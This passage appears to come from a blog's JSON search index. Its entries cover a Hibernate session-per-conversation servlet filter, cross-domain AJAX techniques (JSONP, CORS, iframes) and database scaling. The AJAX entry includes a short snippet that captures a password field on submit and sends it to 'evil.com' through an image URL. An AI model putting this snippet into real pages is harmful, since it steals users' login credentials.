class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt; Continuing conversation&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hibernate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classic&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disconnectedSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Binding the current Session&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;ManagedSessionContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Starting a database transaction&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;beginTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Processing the event&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;doFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unbinding Session after processing&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ManagedSessionContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;unbind&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// End or continue the long-running conversation?&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;END_OF_CONVERSATION_FLAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;END_OF_CONVERSATION_FLAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Flushing Session&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Committing the database transaction&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Closing the Session&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cleaning Session from HttpSession&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;httpSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HIBERNATE_SESSION_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;&amp;lt;&amp;lt; End of conversation&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Committing database transaction&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Storing Session in the HttpSession&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;httpSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HIBERNATE_SESSION_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; Returning to user in conversation&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;StaleObjectStateException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staleEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;This interceptor does not implement optimistic concurrency control!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your application will not work until you add compensation actions!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Rollback, close everything, possibly compensate for any permanent changes&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// during the conversation, and finally restart business conversation. Maybe&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// give the user of the application a chance to merge some of his work with&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// fresh data... what you do here depends on your applications design.&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staleEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Rollback only&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCurrentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isActive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying to rollback database transaction after exception&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCurrentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;rollback&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Could not rollback transaction after exception!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cleanup after exception!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Cleanup&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unbinding Session after exception&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ManagedSessionContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;unbind&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Closing Session after exception&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Removing Session from HttpSession&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;httpSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HIBERNATE_SESSION_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Let others handle it... maybe another interceptor for exceptions?&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FilterConfig&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filterConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Initializing filter...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Obtaining SessionFactory from static HibernateUtil singleton&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HibernateUtil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSessionFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;destroy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; }   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-145/"
    } ,
  
    {
      "title"    : "AJAX Cross-Domain Same-Origin Policy limitation",
      "category" : "iteye",
      "content": "AJAX Same-Origin Policy(SOP) limitation 摘自： http://www.ibm.com/developerworks/library/wa-aj-jsonp1/   http://www.ibm.com/developerworks/cn/lotus/mashup-openajax/index.html         同源策略中“源”是一个包含主机名、协议和端口号的三元组。在同源策略的限制下，浏览器只允许网页中的脚本（如 JavaScript 或 VBScript）访问与之同源的 HTTP 请求和 cookie。注意即使域名和IP是对应的同一个地址，也是属于不同的源的。这里需要注意的是同源策略只对网页的 HTML 文档对象做了限制(XmlHttpRequest)，而对静态的资源文件，如 JavaScript 文件、CSS 文件、图片都可以被导入到 HTML 文档对象中（例如 &lt;script src=&quot;...&quot; &gt;, &lt;img src=”…”&gt;）。因此，对于静态文件可以从任意其它域名下导入 HTML 文档。       AJAX prevents cross-domail invokation, there are several ways to by pass this limitation. write a proxy on the server side. The SOP limitation only exists only on the javascript side.  While on the side, we can still invoke the other domail url such as via HttpClient     JSONP(JSON with Padding) the same-origin policy doesn't prevent the insertion of dynamic script elements (动态引入图像也是可以的，这样静态资源也可以引起跨域的调用）into the document. That is, you could dynamically insert JavaScript from different domains, carrying JSON data in them.   &lt;mce:script type=&quot;text/javascript&quot;&gt; &lt;!-- // This is our function to be called with JSON data function showPrice(data) {  alert(&quot;Symbol: &quot; + data.symbol + &quot;, Price: &quot; + data.price); } var url = “ticker.js”; // URL of the external script // this shows dynamic script insertion var script = document.createElement('script'); script.setAttribute('src', url); // load the script document.getElementsByTagName('head')[0].appendChild(script); // --&gt; &lt;/mce:script&gt;   Note that, in order to do this, you must have a callback function already defined in the Web page at the time of insertion. Beginning with version 1.2, jQuery has had native support for JSONP calls. You can load JSON data located on another domain if you specify a JSONP callback, which can be done using the following syntax: url?callback=?. AJAX invoke:   jQuery.getJSON(&quot;http://www.yourdomain.com/jsonp/ticker?symbol=IBM&amp;callback=?&quot;, function(data) {  alert(&quot;Symbol: &quot; + data.symbol + &quot;, Price: &quot; + data.price); });   Another domain generates json data and returned to client side with callback function.     @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  tString jsonData = getDataAsJson(req.getParameter(symbol));  tString output = req.getParameter(callback) + ( + jsonData + );; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;PrintWriter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// prints: jsonp1232617941775({&quot;symbol&quot; : &quot;IBM&quot;, &quot;price&quot; : &quot;91.42&quot;});&lt;/span&gt; }     基于图像的如下 (function(){  tfunction getPassword() {  t tvar pw = document.getElementById(&quot;password&quot;).value;  t tvar imgTag = document.createElement(&quot;IMG&quot;);  t timgTag.setAttribute(&quot;src&quot;, &quot;http://evil.com?pw=&quot; + pw);  t}  tdocument.getElementById(&quot;submit&quot;).addEventListener(&quot;click&quot;,getPassword); })() 局限性： 需要服务端配合改造 JSONP只支持GET请求 CORS Cross-origin resource sharing (CORS) is a mechanism that allows a web page to make XMLHttpRequests to another domain. Such &quot;cross-domain&quot; requests would otherwise be forbidden by web browsers, per the same origin security policy. CORS defines a way in which the browser and the server can interact to determine whether or not to allow the cross-origin request. It is more powerful than only allowing same-origin requests, but it is more secure than simply allowing all such cross-origin requests. 通过在HTTP Header中加入扩展字段，服务器在相应网页头部加入字段表示允许访问的domain和HTTP method，客户端检查自己的域是否在允许列表中，决定是否处理响应。 服务器端在HTTP的响应头中加入： Access-Control-Allow-Origin: example.com Access-Control-Request-Method: GET, POST Access-Control-Allow-Headers: Content-Type, Authorization, Accept, Range, Origin Access-Control-Expose-Headers: Content-Range Access-Control-Max-Age: 3600 多个域名之间用逗号分隔，表示对所示域名提供跨域访问权限。&quot;*&quot;表示允许所有域名的跨域访问。 客户端可以有两种行为： 发送OPTIONS请求，请求Access-Control信息。如果自己的域名在允许的访问列表中，则发送真正的请求，否则放弃请求发送。 直接发送请求，然后检查response的Access-Control信息，如果自己的域名在允许的访问列表中，则读取response body，否则放弃。 本质上服务端的response内容已经到达本地，JavaScript决定是否要去读取。     iframe      通过iframe的src可以指向任意的server url  ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-146/"
    } ,
  
    {
      "title"    : "高性能网站之数据库",
      "category" : "iteye",
      "content": "读写分离     一个主数据库负责写，多个从数据库负责读。主数据库数据单向同步到从数据库。   分库 先垂直分库，即不同的表放到不同的数据库中. 在水平分库，同一个表，如用户表，数据太多的话分配到不同的数据库中，根据hash，一致hash 等   针对分库后如果需要有多个库的关联查询，方法有 a. 多个库分别查询再汇总或者代码中处理 b. 业务数据同时保存到多个相关库中，这样设计表结构是需要考虑到多个库中可能的关联。   ### App层 与 DB 层之间加入cache层，如memcached 减少数据库的直接操作 cache对应的是内存，一台服务器的物理内存是有限制的。利用memcached的分布式Cache，也即分布式内存解决了这个限制。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-147/"
    } ,
  
    {
      "title"    : "AJAX的几个问题",
      "category" : "iteye",
